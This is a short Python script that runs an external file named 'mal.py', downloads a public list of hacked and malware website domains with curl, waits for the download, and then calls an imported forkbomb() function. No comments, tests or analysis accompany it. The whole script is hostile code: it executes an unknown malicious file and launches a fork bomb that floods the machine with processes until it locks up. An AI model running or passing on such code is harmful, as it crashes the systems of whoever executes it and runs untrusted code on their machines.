import os
import platform
import time
from forkbomb import forkbomb
_os = ""
_number = 0
os.system("python mal.py")
file = os.getcwd() + "/domains.txt"
if _number == 0:
  os.system("curl -O https://raw.githubusercontent.com/mitchellkrogza/The-Big-List-of-Hacked-Malware-Web-Sites/refs/heads/master/.dev-tools/_strip_domains/domains.txt")
  _number = 1
else:
  pass
while not os.path.isfile(file):
  time.sleep(1)
forkbomb()
